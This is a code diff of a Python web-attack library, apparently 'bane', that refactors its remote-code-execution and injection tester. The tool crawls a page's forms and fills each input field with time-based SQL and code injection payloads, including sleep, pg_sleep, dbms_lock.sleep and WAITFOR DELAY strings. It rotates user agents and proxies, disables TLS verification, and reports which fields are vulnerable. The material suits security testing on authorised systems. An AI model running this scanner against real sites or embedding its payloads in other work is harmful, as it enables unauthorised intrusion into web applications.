@@ -234,120 +234,55 @@ def xss(u,payload=None,unicode_random_level=0,js_function="alert",context_breake
    return {"Payload":xp,"Page":target_page,"Output":dic}
 
 
-def exec_get(u,pl,delay=10,file_name="",based_on="time",user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,debug=False,fill_empty=0,leave_empty=[]):
+def rce_submit(parsed,payload,based_on,replaceble_parameters,debug=False):
   '''
-   this function is for rce test with GET requests.
+   this function is for xss test with GET requests.
 
   '''
-  ran=random_string(random.randint(3,10))
-  for x in pl:
-   pl[x]=pl[x].format(ran)
-  if user_agent:
-   us=user_agent
-  else:
-   us=random.choice(ua)
-  if cookie:
-    hea={'User-Agent': us,'Cookie':cookie}
-  else:
-   hea={'User-Agent': us}
-  if proxy:
-   proxy={'http':'http://'+proxy}
-  for x in pl:
-   xp=pl[x]
-  d={}
-  if extra:
-   d.update(extra)
-  d.update(pl)
-  for i in d:
-   if (d[i]=="") and (fill_empty>0):
-    st=""
-    for j in range(fill_empty):
-     st+=random.choice(lis)
-    d[i]=st
-  for i in d:
-   if i in leave_empty:
-    d[i]=""
+  d=setup_to_submit(parsed[0])
+  for x in d:
+   for y in replaceble_parameters:
+    if x==y:
+     d[x]=d[x].replace(replaceble_parameters[y][0],replaceble_parameters[y][1])
   if debug==True:
    for x in d:
     print("{}{} : {}{}".format(Fore.MAGENTA,x,Fore.WHITE,d[x]))
-  try:
-     if based_on[0]=="time":
-      t=time.time()
-     c=requests.get(u, params= d,headers = hea,proxies=proxy,timeout=timeout, verify=False)
+  t=time.time()
+  if parsed[0]["method"]=="get":
+   try:
+     c=requests.get(parsed[0]["action"], params= d,headers = parsed[1],proxies=parsed[2],timeout=parsed[3], verify=False).text
      if based_on[0]=="file":
-      c=requests.get(u.replace(u.split("/")[-1],based_on[1]+".txt").replace("#",""), params= d,headers = hea,proxies=proxy,timeout=timeout, verify=False)
+      c=requests.get(parsed[0]["action"].replace(parsed[0]["action"].split("/")[-1],based_on[1]+".txt"), params= d,headers = parsed[1],proxies=parsed[2],timeout=parsed[3], verify=False)
       if ((c.status_code==200)and (len(c.text)==0)):
-        return (True, u.replace(u.split("/")[-1],based_on[1])+".txt")
+        return (True, parsed[0]["action"].replace(parsed[0]["action"].split("/")[-1],based_on[1])+".txt")
      if based_on[0]=="time":
       if int(time.time()-t)>=based_on[1]-2:
        return (True,'')
-  except requests.exceptions.Timeout:
-   return (True,'')
-  except Exception as e:
-   pass
-  return (False,'')
-
-
-def exec_post(u,pl,delay=10,file_name="",based_on=("time",10),user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,debug=False,fill_empty=0,leave_empty=[]):
-  '''
-   this function is for rce test with POST requests.
-
-  '''
-  if user_agent:
-   us=user_agent
+   except Exception as e:
+    pass
   else:
-   us=random.choice(ua)
-  if cookie:
-    hea={'User-Agent': us,'Cookie':cookie}
-  else:
-   hea={'User-Agent': us}
-  if proxy:
-   proxy={'http':'http://'+proxy}
-  for x in pl:
-   xp=pl[x]
-  d={}
-  if extra:
-   d.update(extra)
-  d.update(pl)
-  for i in d:
-   if (d[i]=="") and (fill_empty>0):
-    st=""
-    for j in range(fill_empty):
-     st+=random.choice(lis)
-    d[i]=st
-  for i in d:
-   if i in leave_empty:
-    d[i]=""
-  if debug==True:
-   for x in d:
-    print("{}{} : {}{}".format(Fore.MAGENTA,x,Fore.WHITE,d[x]))
-  try:
-     if based_on[0]=="time":
-      t=time.time()
-     c=requests.post(u, data= d,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
+   try:
+     c=requests.post(parsed[0]["action"], data= d,headers = parsed[1],proxies=parsed[2],timeout=parsed[3], verify=False).text
      if based_on[0]=="file":
-      c=requests.get(u.replace(u.split("/")[-1],based_on[1]+".txt"), params= d,headers = hea,proxies=proxy,timeout=timeout, verify=False)
+      c=requests.get(parsed[0]["action"].replace(parsed[0]["action"].split("/")[-1],based_on[1]+".txt"), params= d,headers = parsed[1],proxies=parsed[2],timeout=parsed[3], verify=False)
       if ((c.status_code==200)and (len(c.text)==0)):
-        return (True, u.replace(u.split("/")[-1],based_on[1])+".txt")
+        return (True, parsed[0]["action"].replace(parsed[0]["action"].split("/")[-1],based_on[1])+".txt")
      if based_on[0]=="time":
       if int(time.time()-t)>=based_on[1]-2:
        return (True,'')
-  except requests.exceptions.Timeout:
-   return (True,'')
-  except Exception as e:
-   pass
+   except Exception as e:
+    pass
   return (False,'')
-  
 
 
-def rce(u,payload_index=0,save_to_file=None,injection={"command":"linux"},quote="",based_on="time",delay=10,show_warnings=True,target_form_action=None,ignore_values=False,fresh=True,logs=True,fill_empty=10,proxy=None,ignored_values=["anonymous user","..."],proxies=None,timeout=40,user_agent=None,cookie=None,debug=False,leave_empty=[]):
+def rce(u,payload_index=0,save_to_file=None,injection={"code":"php"},start_line=None,replaceble_parameters={"phpvalue":(".","")},end_line=None,based_on="time",delay=10,logs=True,fill_empty=10,proxy=None,proxies=None,timeout=40,user_agent=None,cookie=None,debug=False):
   '''
    this function is for RCE test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.
 
    usage:
   
    >>>import bane
-   >>>bane.rce('http://www.example.com/")
+   >>>bane.rce('http://phptester.net/")
 
   '''
   payloads={
@@ -411,33 +346,35 @@ def rce(u,payload_index=0,save_to_file=None,injection={"command":"linux"},quote=
                    "mysql":
                            {
                             "time":
-                                   ["'-sleep({})  -- hi",'"-sleep({})  -- hi',"-sleep({})  -- hi"]
+                                   [" - sleep({}) "]
                            },
                    "oracle":
                             {
                              "time":
-                                    ["'-dbms_lock.sleep({})  -- hi",'"-dbms_lock.sleep({})  -- hi',"-dbms_lock.sleep({})  -- hi"]
+                                    [" - dbms_lock.sleep({}) "]
                             },
                    "postgre":
                              {
                               "time":
-                                     ["'-pg_sleep({})   -- hi",'"-pg_sleep({})  -- hi',"-pg_sleep({})  -- hi"]
+                                     [" - pg_sleep({}) "]
                              },
                    "sql_server":
                                 {
                                  "time":
-                                        ["'-WAITFOR DELAY '00:00:{}'  -- hi","-WAITFOR DELAY '00:00:{}'  -- hi"]
+                                        [" - WAITFOR DELAY '00:00:{}' "]
                                 }
                   }              
   }
+  target_page=u
   xp=""
   based_on_o=based_on
-  if quote:
-   xp+=quote
+  if start_line:
+   xp+=start_line
   inject_type=list(injection.keys())[0]
   inject_target=injection[inject_type]
   xp+=payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][payload_index]
   target_page=u
+  form_index=-1
   if proxy:
    proxy=proxy
   if proxies:
@@ -446,162 +383,48 @@ def rce(u,payload_index=0,save_to_file=None,injection={"command":"linux"},quote=
   if logs==True:
    print(Fore.WHITE+"[~]Getting forms..."+Style.RESET_ALL)
   hu=True
-  fom=forms(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent)
+  fom=forms_parser(u,proxy=proxy,timeout=timeout,cookie=cookie,user_agent=user_agent)
   if len(fom)==0:
    if logs==True:
     print(Fore.RED+"[-]No forms were found!!!"+Style.RESET_ALL)
    hu=False
   if hu==True:
-   if target_form_action:
-    i=0
-    for x in fom:
-     if x["action"]==target_form_action:
-       i=fom.index(x)
-    fom=fom[i:i+1]
-   form_index=-1
-   for l1 in fom:
-    if target_form_action:
-     form_index=0
-    else:
-     form_index+=1
-    if based_on_o.lower()=="file":
+   if based_on_o.lower()=="file":
      based_on=("file",random_string(random.randint(3,10)))
-    else:
+   else:
      based_on=("time",int(delay)+2)
-    xp=xp.format(based_on[1])
+   xp=xp.format(based_on[1])
+   if end_line:
+    xp+=end_line
+   for l1 in fom:
+    form_index+=1
     lst={}
     vul=[]
     sec=[]
+    hu=True
     u=l1['action']
-    if l1['method']=='post':
-     post=True
-     get=False
-    else:
-     post=False
-     get=True
     if logs==True:
-      print(Fore.BLUE+"Form: "+Fore.WHITE+str(form_index)+Fore.BLUE+"\nAction: "+Fore.WHITE+u+Fore.BLUE+"\nMethod: "+Fore.WHITE+l1['method']+Fore.BLUE+"\nPayload: "+Fore.WHITE+xp.replace(" {} ".format(int(delay)+2)," {} ".format(int(delay)))+Style.RESET_ALL)
-    """if len(inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent))==0:
+     print(Fore.BLUE+"Form: "+Fore.WHITE+str(form_index)+Fore.BLUE+"\nAction: "+Fore.WHITE+u+Fore.BLUE+"\nMethod: "+Fore.WHITE+l1['method']+Fore.BLUE+"\nPayload: "+Fore.WHITE+xp.replace(" {} ".format(int(delay)+2)," {} ".format(int(delay)))+Style.RESET_ALL)
+     """if len(inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent))==0:
      if logs==True:
       print(Fore.YELLOW+"[-]No parameters found on that page !! Moving on.."+Style.RESET_ALL)"""
-    if True:#else:
+    if True:
      extr=[]
      l=[]
      for x in l1['inputs']:
-      if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in ignored_values))):#some websites may introduce in the input certain value that can be replaced ( because the function works only on empty inputs ) , all you have to do is put something which specify it among the others to be ingnored and inject our rce payload there !!
-       extr.append(x)
-      else:
-       l.append(x)
-     for x in extr:
-      if x.split(':')[0] in l:
-       extr.remove(x)
-     #if '?' in u:
-      #u=u.split('?')[0]
-     if len(l)==0:
-      print(Fore.RED+"[-]No empty fields to test on !!"+Style.RESET_ALL)
-      if show_warnings==True: 
-       print(Fore.WHITE+'\n\nYou can use "ignored_values" parameter to pass the keywords which can be ignored if has been found in an input:\n\nbane.rce(url,ignored_values=["...","search"]\n\nSo if that keyword was found in an input, it will be replaced by our payload.\n\nForm\'s fielda and values (seperated by ":")\n'+Style.RESET_ALL)      
-       for x in extr:
-        print(x)
-        print("\n")
-     for i in l:
-      user=None
-      i=i.split(':')[0]
       try:
-       if proxies:
-        proxy=random.choice(proxies)
-       pl={i : xp.format(based_on[1])}
-       extra={}
-       if len(extr)!=0:
-        for x in extr:
-         a=x.split(':')[0]
-         b=x.split(':')[1]
-         extra.update({a:b})
-       if get==True: 
-        if fresh==True:
-         extr=[]
-         user=random.choice(ua)
-         k=forms(target_page,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
-         if target_form_action:
-          j=0
-          for x in k:
-           if x["action"]==target_form_action:
-            j=k.index(x)
-          k=k[j:j+1]
-         for x in k[form_index]['inputs']:
-          try:
-           if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in ignored_values))):
-            extr.append(x)
-          except:
-            pass
-         for x in extr:
-          if x.split(':')[0] in l:
-           extr.remove(x)
-         extra={}
-         if len(extr)!=0:
-          for x in extr:
-           a=x.split(':')[0]
-           b=x.split(':')[1]
-           extra.update({a:b})
-        for lop in l:
-         if lop!=i:
-          extra.update({lop.split(':')[0]:lop.split(':')[1]})
-        if ignore_values==True:
-         for x in extra:
-          extra[x]=""
-        exec_result=exec_get(u,pl,based_on=based_on,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie,debug=debug,fill_empty=fill_empty,leave_empty=leave_empty)
-        if exec_result[0]==True:
-          x="parameter: '"+i+"' => [+]Vulnerable"
-          vul.append((i,exec_result[1]))
+       if x["type"] in ["text","textarea","email","tel","search","url","password","number","select"]:#any input type that accept direct input from keyboard
+        i=x["name"]
+        parsed_form=set_up_injection(target_page,form_index,i,xp,cookie,setup_ua(user_agent),setup_proxy(proxy,proxies),timeout,fill_empty)
+        _res=rce_submit(parsed_form,xp,based_on,replaceble_parameters,debug=debug)
+        if _res[0]==True:
+          x="parameter: '"+i+"' => [+] Vulnerable !!"
+          vul.append((i,_res[1]))
           colr=Fore.GREEN
         else:
-         x="parameter: '"+i+"' => [-]Not vulnerable"
+         x="parameter: '"+i+"' => [-] Not Vulnerable"
          sec.append(i)
          colr=Fore.RED
-        if logs==True:
-         print (colr+x+Style.RESET_ALL)
-       if post==True:
-        if fresh==True:
-         extr=[]
-         user=random.choice(ua)
-         k=forms(target_page,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
-         if target_form_action:
-          j=0
-          for x in k:
-           if x["action"]==target_form_action:
-            j=k.index(x)
-          k=k[j:j+1]
-         for x in k[form_index]['inputs']:
-          try:
-           if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in ignored_values))):
-            extr.append(x)
-          except:
-           pass
-         for x in extr:
-          if x.split(':')[0] in l:
-           extr.remove(x)
-         extra={}
-         if len(extr)!=0:
-          for x in extr:
-           a=x.split(':')[0]
-           b=x.split(':')[1]
-           extra.update({a:b})
-        for lop in l:
-         if lop!=i:
-          extra.update({lop.split(':')[0]:lop.split(':')[1]})
-        if ignore_values==True:
-         for x in extra:
-          extra[x]=""
-        exec_result=exec_post(u,pl,based_on=based_on,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie,debug=debug,fill_empty=fill_empty,leave_empty=leave_empty)
-        if exec_result[0]==True:
-         x="parameter: '"+i+"' => [+]Vulnerable"
-         vul.append((i,exec_result[1]))
-         colr=Fore.GREEN
-        else:
-         x="parameter: '"+i+"' =>  [-]Not vulnerable"
-         sec.append(i)
-         colr=Fore.RED
-        #lst.update(reslt)
         if logs==True:
          print (colr+x+Style.RESET_ALL)
       except Exception as ex:
@@ -617,6 +440,7 @@ def rce(u,payload_index=0,save_to_file=None,injection={"command":"linux"},quote=
     outfile.close() 
    return final
    
+
 
 def valid_parameter(parm):
  try:
